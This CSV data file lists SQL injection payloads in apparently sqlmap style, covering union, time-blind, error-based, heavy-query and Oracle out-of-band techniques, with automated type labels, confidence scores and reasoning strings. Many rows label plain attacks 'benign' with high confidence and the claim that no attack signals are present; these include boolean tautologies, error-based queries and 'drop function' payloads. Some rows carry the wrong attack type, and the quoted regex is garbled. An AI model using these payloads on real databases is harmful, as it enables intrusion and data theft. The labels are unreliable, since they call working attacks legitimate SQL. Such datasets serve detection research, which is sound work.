id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
24172,-8357' ) ) as henk where 8198 = 8198 or 2558 = 9103#,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24173,1' ) as yxdb where 4597 = 4597,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24174,-1393' ) ) ) union all select 8280--,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24175,"1 where 9869 = 9869 union all select null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24176,select ( case when ( 8294 = 4332 ) then 1 else 8294* ( select 8294 from master..sysdatabases ) end ) --,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24177,"1' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24178,"1' ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
24179,"-3775' ) as rqet where 7092 = 7092 or elt ( 1032 = 1032,3623 ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24180,"1' ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( 'dtym' = 'dtym",error_based,generic,0.85,Signal match: updatexml → error_based (P4); confidence: 0.85,1
24181,"1"" ) where 5196 = 5196 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",error_based,oracle,0.85,Signal match: ctxsys.drithsx → error_based (P4); DB signature: oracle,1
24182,"1 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) -- ofqd",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24183,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( ""sxih"" = ""sxih",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24184,-4325 order by 1--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24185,"-2321%"" ) or 2271 = 7683--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24186,"1"" ) as ranl where 5553 = 5553",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24187,"1' ) where 8628 = 8628 union all select null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24188,"-3007 ) where 6648 = 6648 union all select 6648,6648,6648,6648,6648,6648,6648,6648#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24189,1'|| ( select 'awba' from dual where 3749 = 3749 and 1445 = 3334--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24190,"-6186' in boolean mode ) union all select 2990,2990,2990#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24191,"1' ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24192,"1"" or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24193,"1' ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'xdce' = 'xdce",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
24194,"1 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24195,"1"" where 4073 = 4073 rlike ( select ( case when ( 8716 = 4281 ) then 1 else 0x28 end ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24196,"1"" ) ) ) union all select null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24197,"waitfor delay '0:0:5' and ( ( ""%"" = """,time_blind,mssql,0.85,Signal match: waitfor delay → time_blind (P5); DB signature: mssql,1
24198,"1"" ) where 2312 = 2312 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24199,"-9434"" ) as cqlw where 1600 = 1600 or 2733 = 1047--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24200,"1 ) ) ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24201,"1"" ) ) and sleep ( 5 ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24202,"-5925 ) where 5758 = 5758 union all select 5758,5758,5758,5758,5758,5758,5758,5758,5758#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24203,"1"" ) where 2873 = 2873 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24204,"1 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) # usus",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
24205,"1"" where 6004 = 6004",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24206,"1"" ) ) as svim where 4924 = 4924 and 7932 = 5870",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24207,"1"" ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
24208,"1 ) union all select null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24209,"-2951"" or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) )",out_of_band,oracle,0.95,Signal match: utl_inaddr.get_host_address → out_of_band (P2),1
24210,"1%' ) ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24211,-4644 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) # upwd,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24212,"1' ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( 'ochr' like 'ochr",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
24213,"1"" and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ""arqb"" like ""arqb",out_of_band,oracle,0.95,Signal match: utl_inaddr.get_host_address → out_of_band (P2),1
24214,"1 ) where 7978 = 7978 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
24215,"-9977"" where 5132 = 5132 union all select 5132--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24216,-8047' or 3038 = 3038,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24217,"1' ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( 'uwbh' = 'uwbh",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24218,"1 union all select null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24219,1' ) ) ) and 7533 = 7533 and ( ( ( 'txex' = 'txex,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24220,1 ) as duqb where 6495 = 6495,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24221,"1' ) ) as gqzy where 2312 = 2312 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24222,"1%' ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( '%' = '",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
24223,"1' ) where 9304 = 9304 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
24224,"1'|| ( select 'djoe' from dual where 8063 = 8063 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) ) ||'",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24225,-8553'+ ( select adko where 1750 = 1750 union all select 1750#,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24226,"1"" where 9792 = 9792 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24227,"select * from generate_series ( 8147,8147,case when ( 8147 = 6336 ) then 1 else 0 end ) limit 1--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24228,"-7889"" ) ) as oayf where 1765 = 1765 or 8571 = 8571--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24229,"1'|| ( select 'mzhj' where 9677 = 9677 union all select null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24230,1' where 7910 = 7910,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24231,end and ( ( ( 4675 = 4675,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24232,select ( case when ( 9696 = 2874 ) then 1 else 9696* ( select 9696 from master..sysdatabases ) end ) --,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24233,"1' ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'tzrd' = 'tzrd",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
24234,"1"" ) as ymsc where 3694 = 3694 waitfor delay '0:0:5'--",time_blind,mssql,0.85,Signal match: waitfor delay → time_blind (P5); DB signature: mssql,1
24235,1'|| ( select 'npel' from dual where 5258 = 5258,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24236,"1'+ ( select vohg where 6383 = 6383 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +'",error_based,oracle,0.85,Signal match: ctxsys.drithsx → error_based (P4); DB signature: oracle,1
24237,"1' ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'niro' = 'niro",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24238,1%' ) ) rlike ( select ( case when ( 6094 = 7893 ) then 1 else 0x28 end ) ) and ( ( '%' = ',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24239,"1 ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
24240,1' ) where 5540 = 5540 waitfor delay '0:0:5'--,time_blind,mssql,0.85,Signal match: waitfor delay → time_blind (P5); DB signature: mssql,1
24241,1' ) rlike ( select ( case when ( 7447 = 3981 ) then 1 else 0x28 end ) ),benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24242,1'+ ( select lptb where 3861 = 3861 or sleep ( 5 ) ) +',time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24243,if ( 6767 = 5022 ) select 6767 else drop function buii--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24244,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( ""eakt"" like ""eakt",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24245,"1"" ) ) ) and 2006 = 2006",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24246,"-9370' ) where 7070 = 7070 or make_set ( 9354 = 9354,7185 ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24247,"1 where 6169 = 6169 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24248,-4906' ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 'pkrq' = 'pkrq,out_of_band,oracle,0.95,Signal match: utl_inaddr.get_host_address → out_of_band (P2),1
24249,"1'+ ( select vxax where 9036 = 9036 and elt ( 1210 = 1210,sleep ( 5 ) ) ) +'",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24250,1 ) as bpap where 7758 = 7758 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
24251,-1188 ) ) union all select 4711--,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24252,"-2601' ) union all select 2866,2866,2866,2866,2866,2866--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24253,1 ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( 1233 = 1233,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24254,"1 where 6965 = 6965 and elt ( 3933 = 1232,1232 ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24255,"1%"" ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24256,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ( 'xmwj' = 'xmwj",time_blind,oracle,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
24257,"1'|| ( select 'nvrq' from dual where 4337 = 4337 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,oracle,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24258,"-1606'|| ( select 'qbaa' where 3967 = 3967 union all select 3967,3967,3967,3967,3967--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24259,"1' ) as jrwx where 6087 = 6087 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --",error_based,generic,0.85,Signal match: updatexml → error_based (P4); confidence: 0.85,1
24260,"1' ) ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ( 'wnzv' = 'wnzv",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
24261,"1' ) or elt ( 6272 = 6272,sleep ( 5 ) )",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24262,"1' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
24263,"-9629' ) ) ) union all select 3077,3077,3077,3077#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24264,"-1876'|| ( select 'itfc' from dual where 9584 = 9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",union_based,oracle,0.75,Signal match: union (all )?select → union_based (P7),1
24265,-5369' ) or 3208 = 6669#,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24266,1 ) ) as prxq where 4600 = 4600,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24267,1%' ) ) ) rlike sleep ( 5 ) #,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24268,"1' and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24269,"1 ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( 2160 = 2160",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24270,"1"" ) ) as jsdc where 2748 = 2748",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24271,"-9507%"" union all select 3342,3342,3342,3342,3342#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24272,1 ) where 9708 = 9708,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24273,"1%"" and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ""%"" = """,heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24274,"-9119"" ) where 9237 = 9237 or 8571 = 8571--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24275,"1' ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 'dhwt' = 'dhwt",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24276,"1%"" ) ) ) or sleep ( 5 ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24277,"1%' and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and '%' = '",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24278,"1' ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and 'aicu' = 'aicu",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24279,"1"" ) where 9511 = 9511 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24280,"1 ) as iuje where 1976 = 1976 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
24281,1' ) as eyzk where 2489 = 2489 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,out_of_band,oracle,0.95,Signal match: utl_inaddr.get_host_address → out_of_band (P2),1
24282,"1%"" ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
24283,select ( case when ( 1961 = 2048 ) then 1961 else 1961* ( select 1961 from information_schema.character_sets ) end ) #,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24284,1'|| ( select 'iuud' where 3687 = 3687,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
